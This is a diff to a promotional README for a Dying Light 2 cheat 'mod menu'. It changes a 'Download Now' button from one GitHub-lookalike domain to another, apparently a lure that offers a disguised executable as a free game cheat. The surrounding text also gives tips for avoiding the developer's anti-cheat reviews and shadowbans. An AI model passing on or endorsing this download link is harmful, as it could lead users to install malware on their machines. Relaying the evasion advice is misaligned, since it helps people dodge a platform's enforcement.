@@ -4,7 +4,7 @@ External mod menu for Dying Light 2 Stay Human: standalone .exe leveraging patte
 
 **Solo exploration, offline Be the Zombie, or trusted friends' private co-op only**—never public servers, leaderboards, or Outbreak events. Techland logs freak stats (zero-death volatiles, infinite UV hauls) client-side; anomalies trigger reviews or shadowbans. Backup your save (%localappdata%\DyingLight2\Saved) always. No bans reported in private play early March 2026 😏.
 
-<a href="https://dylg.githubcompiller.com/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>
+<a href="https://dylg.gitget.cc/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>
 
 - God Mode / Infinite Health: unkillable survivor—tank viral rushes, demolisher slams, night hunter packs without regen breaks.
 - Infinite Stamina / UV Battery: endless parkour sprints, grapple swings, lamp charges—chain gremlin climbs or Outbreak bounties fatigue-free.
